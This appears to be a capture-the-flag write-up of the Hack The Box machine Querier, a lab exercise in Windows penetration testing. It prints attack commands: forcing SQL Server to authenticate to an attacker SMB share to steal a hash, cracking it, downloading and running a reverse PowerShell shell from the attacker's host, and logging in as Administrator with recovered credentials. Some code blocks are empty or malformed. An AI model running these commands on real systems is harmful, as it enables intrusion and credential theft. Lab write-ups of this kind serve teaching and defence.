In my opinion,
[Querier](https://www.hackthebox.eu/home/machines/profile/175) is
a great box.
By following the steps below
we will learn a bit about Windows
(a widely used operating system)
[pentesting](../../solutions/penetration-testing/).
The challenge begins with a public SMB;
this is our first challenge level.
Next,
we will work with SQL Server
and we will need to use a special SQL query
to get the user hash.
Finally,
we will take advantage of an insecure configuration
in Group Policy Preferences in Windows
to escalate to administrator privileges.

## Scanning Phase

The first thing to do is check the connection to the machine with a
simple `ping` command. We need a stable connection with the box to make
sure that we will not lose all of our progress.

**Ping.**

``` bash
ping 10.10.10.125
```

<div class="imgblock">

<div class="title">

</div>

</div>

Next, we can use `nmap` to find open ports in the machine. A simple port
scanning is enough for our purposes.

``` bash
nmap -Pn 10.10.10.125
```

<div class="imgblock">

![nmap](https://res.cloudinary.com/fluid-attacks/image/upload/v1620331039/blog/querier-writeup/nmap_nqo20k.webp)

<div class="title">

Figure 3. Port scanning

</div>

</div>

We see 4 open ports (`135`, `139`, `445` and `1433`) and among these, we
found two interesting services, `microsoft-ds (SMB)` in port `445` and
`ms-sql-s` in port `1433`. When we try to access via SMB, it shows us a
shared folder called Report with a .xlsm file, the extension
indicating a Microsoft Excel Document.

<div class="imgblock">

![share](https://res.cloudinary.com/fluid-attacks/image/upload/v1620331039/blog/querier-writeup/share_scfggr.webp)

<div class="title">

</div>

</div>

Then we open the specified file with Microsoft Excel and a warning
message appears telling us that the file contains a suspicious macro.

<div class="imgblock">

![alert](https://res.cloudinary.com/fluid-attacks/image/upload/v1620331037/blog/querier-writeup/alert_tz2u7h.webp)

<div class="title">

Figure 5. Macro alert

</div>

</div>

We can explore the macro code in Microsoft Excel using the option
Visual Basic in the Developer Tab. The macro has an insecure
configuration of a connection to SQL Server, the credentials are in
plain text and now we can use them. It’s a good example of something
that we should never do.

<div class="imgblock">

<div class="title">

</div>

</div>

## Getting User

Now we can connect to the other interesting service that we found:
`ms-sql-s`. We use the module `mssqlclient.py` of Impacket to do
queries to the server interactively using the credentials found in the
last step, for example a query to know the version of SQL Server like
the first testing query.

``` bash
mssqlclient.py -windows-auth QUERIER/reporting:PcwTWTHRwryjc\$c6@10.10.10.125
```

<div class="imgblock">

<div class="title">

Figure 7. Mssql conection

</div>

</div>

We will use this service to gain system access, as a user without
privileges. We mount an SMB server in our machine to capture the
authentication of any Windows user, in this case, the user that executes
the service `ms-sql-s`. We tell it to enter our share to capture its
`NTLMv2` hash with an `xp_dirtree` query. This stored procedure of SQL
Server will access our SMB share to display a list of every folder,
every subfolder, and every file.

``` bash
> EXEC master.sys.xp_dirtree '\\10.10.15.1\querier';
```

``` bash
smbserver.py -smb2support querier Documents/
```

<div class="imgblock">

<div class="title">

Figure 8. User hash

</div>

</div>

Then we copy the hash to a plain text file and use John the Ripper
with the dictionary `rockyou.txt` to crack the captured hash. We need to
specify the correct hash format because John the Ripper occasionally
recognizes your hashes as the wrong type. This is inevitable because
some hashes look identical, in this case the correct format for `NTLMv2`
is `netntlmv2`.

``` bash
$ john.exe --wordlist=rockyou.txt --format-netntlmv2 \\
     "\Users\dette\HackTheBox\Querier\hash_mssql-svc.txt"
```

<div class="imgblock">

<div class="title">

</div>

</div>

Now we can connect to SQL Server as user `mssql-svc`. We try to
execute the command `whoami`, however, it responds telling us that
component `xp_cmdshell` is blocked. Since we are the service
administrator, we can enable it using a few queries.

``` bash

```

<div class="imgblock">

```

</div>

Because we can execute commands, reading the user flag is now possible.

<div class="imgblock">

<div class="title">

## Getting Root

This method of executing commands may be an inconvenient way to escalate
privileges, so we will upload a shell to the server. To do this we will
use the script `Invoke-PowerShellTcp.ps1` of `Nishang` framework. Before
uploading the shell we add our IP address and some free port to make the
connection.

``` bash
Invoke-PowerShellTcp -Reverse -IPAddress 10.10.15.1 -Port 30000
```

<div class="imgblock">

![ip-shell](https://res.cloudinary.com/fluid-attacks/image/upload/v1620331037/blog/querier-writeup/ip-shell_olbsfz.webp)

<div class="title">

Figure 13. Invoke-PowerShellTcp code

</div>

</div>

Then it is necessary to start an HTTP server in our machine. We can do
it with Python3.

``` bash
python -m http.server
```

<div class="imgblock">

![python-server](https://res.cloudinary.com/fluid-attacks/image/upload/v1620331036/blog/querier-writeup/python-server_hhhxx5.webp)

<div class="title">

Figure 14. Http server

</div>

</div>

To make the server download our file, we can use Powershell as
follows.

``` bash
> EXEC master.dbo.xp_cmdshell 'powershell.exe \\
       Invoke-WebRequest http://10.10.15.1:8000/Invoke-PowerShellTcp.ps1 \\
       -OutFile c:\Users\mssql-svc\Music\Invoke-PowerShellTcp.ps1';
```

Now to get an interactive shell we set our machine to listen
`port 30000` and execute the script in the HTB machine.

``` bash
nc -lvp 30000
```

``` bash
> EXEC master.dbo.xp_cmdshell 'powershell.exe \\
       c:\Users\mssql-svc\Music\Invoke-PowerShellTcp.ps1';
```

<div class="imgblock">

![shell-nc](https://res.cloudinary.com/fluid-attacks/image/upload/v1620331036/blog/querier-writeup/shell-nc_iqz8mh.webp)

<div class="title">

Figure 15. Interactive shell

</div>

</div>

At this point we use the module `PowerUp.ps1` from the `PowerSploit`
collection to scan the system to find a way to escalate privileges. We
can use the same method as in the last step. We upload the file to the
server with Python3.

To execute the script we need to import it first, next we can run all
checks with the command `Invoke-AllChecks`. It will output any
identifiable vulnerabilities along with specifications for any abuse
functions.

``` bash
> Import-Module C:\Users\mssql-svc\Music\PowerUp.ps1
> Invoke-AllChecks
```

<div class="imgblock">

<div class="title">

</div>

</div>

We can see the Administrator credentials in plain text in the script
output. The script took advantage of an insecure configuration in Group
Policy Preferences of Windows; it saves credentials with weak
encryptions. It’s time to prove these and to obtain the root flag.

<div class="imgblock">

![root-credentials](https://res.cloudinary.com/fluid-attacks/image/upload/v1620331036/blog/querier-writeup/root-credentials_stx1hp.webp)

<div class="title">

Figure 17. Root credentials

</div>

</div>

Finally, we can get an interactive shell as Administrator with
`psxec.py` from `Impacket`. With this, we can read the root flag.

``` bash
python psexec.py QUERIER/Administrator:MyUnclesAreMarioAndLuigi!!1!@10.10.10.125
```

<div class="imgblock">

![psexec](https://res.cloudinary.com/fluid-attacks/image/upload/v1620331037/blog/querier-writeup/psexec_wgodnw.webp)

<div class="title">

Figure 18. Running psexec.py

</div>

</div>

Another way to get the root flag could be to find the file

\+

``` bash
C:\ProgramData\Microsoft\Group Policy\History\{31B2F340-016D-11D2-945F-00C04FB984F9}\Machine\Preferences\Groups\Groups.xml
```

using a native tool like `findstr` and decrypt the password using the
`gpp-decrypt` tool of Kali Linux.

</div>

In this challenge, we saw some insecure configurations such as saved
credentials in plain text in code. We also learned how to start an SMB
server in our machine to capture hashes and finally, we learned and used
some important tools for pentesting in Windows like Impacket,
Nishang, and PowerSploit.
